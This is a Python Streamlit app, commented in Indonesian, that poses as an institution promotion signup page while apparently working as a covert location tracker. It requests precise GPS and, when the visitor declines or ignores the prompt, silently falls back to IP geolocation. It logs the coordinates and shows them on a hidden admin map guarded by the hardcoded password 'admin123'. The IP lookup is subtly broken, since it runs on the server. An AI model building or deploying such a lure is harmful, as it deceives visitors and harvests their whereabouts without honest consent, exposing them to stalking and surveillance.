import streamlit as st
from streamlit_geolocation import streamlit_geolocation
import pandas as pd
import requests
import os
import datetime

st.set_page_config(page_title="Pelacak Lokasi Otomatis", layout="centered")

LOCAL_DB = "data_lokasi_instansi.csv"

def muat_data():
    if os.path.exists(LOCAL_DB):
        return pd.read_csv(LOCAL_DB)
    return pd.DataFrame(columns=["waktu", "metode", "latitude", "longitude"])

def simpan_data(metode, lat, lon):
    df = muat_data()
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data_baru = pd.DataFrame([[waktu, metode, lat, lon]], columns=["waktu", "metode", "latitude", "longitude"])
    df = pd.concat([df, data_baru], ignore_index=True)
    df.to_csv(LOCAL_DB, index=False)
    return df

def ambil_lokasi_via_ip():
    try:
        response = requests.get("http://ip-api.com", timeout=3)
        data = response.json()
        if data.get('status') == 'success':
            return data.get('lat'), data.get('lon')
    except:
        pass
    return None, None

# ================= HALAMAN DEPAN (UNTUK INSTANSI) =================
st.title("📍 Aktivasi Promosi Instansi")
st.write("Selamat datang! Posisi instansi Anda sedang didaftarkan ke sistem database promosi kami.")

# Jalankan sistem deteksi tombol GPS komponen
lokasi_gps = streamlit_geolocation()

if "status_daftar" not in st.session_state:
    st.session_state["status_daftar"] = "Belum Terdaftar"

# KONDISI 1: Pengguna mengizinkan GPS Akurat
if lokasi_gps.get("latitude") and lokasi_gps.get("longitude"):
    if st.session_state["status_daftar"] != "GPS Akurat Terkunci":
        lat = lokasi_gps["latitude"]
        lon = lokasi_gps["longitude"]
        simpan_data("Satelit GPS (Presisi)", lat, lon)
        st.session_state["status_daftar"] = "GPS Akurat Terkunci"
        st.success("🎉 LUAR BIASA! Koordinat GPS presisi Anda berhasil dikunci secara otomatis!")
        st.balloons()

# KONDISI 2: Pengguna diam saja atau memblokir pop-up (Otomatis ambil IP)
else:
    if st.session_state["status_daftar"] == "Belum Terdaftar":
        lat_ip, lon_ip = ambil_lokasi_via_ip()
        if lat_ip and lon_ip:
            simpan_data("IP Internet (Kota)", lat_ip, lon_ip)
            st.session_state["status_daftar"] = "Lokasi IP Terkunci"
            st.info("⚡ Sistem Otomatis: Lokasi wilayah Anda berhasil dideteksi langsung melalui koneksi internet Anda.")
        else:
            st.warning("Menunggu respons perangkat untuk membaca posisi...")


# ================= DASHBOARD ADMIN (DIKUNCI PASSWORD RAHASIA) =================
st.markdown("<br><br><br><br><br><hr>", unsafe_allow_html=True)
st.write("🔒 *Fitur Khusus Pengembang/Admin*")

# Kolom Input Password Rahasia
password_input = st.text_input("Masukkan Password Admin untuk melihat peta database:", type="password")

# SILAKAN GANTI 'admin123' DENGAN PASSWORD PILIHAN ANDA
if password_input == "admin123":
    st.success("Akses Diterima! Menampilkan Dashboard Admin.")
    st.subheader("📊 Dashboard Hasil Pelacakan")

    df_tampil = muat_data()

    if not df_tampil.empty:
        st.metric(label="Total Lokasi Terlacak", value=len(df_tampil))
        
        # Tampilkan Peta
        st.write("### Peta Sebaran Lokasi")
        st.map(df_tampil)
        
        # Tampilkan Tabel Detail
        st.write("### Log Database")
        st.dataframe(df_tampil, use_container_width=True)
    else:
        st.info("Belum ada lokasi yang masuk.")
elif password_input != "":
    st.error("Password Salah! Akses ke data peta ditolak.")
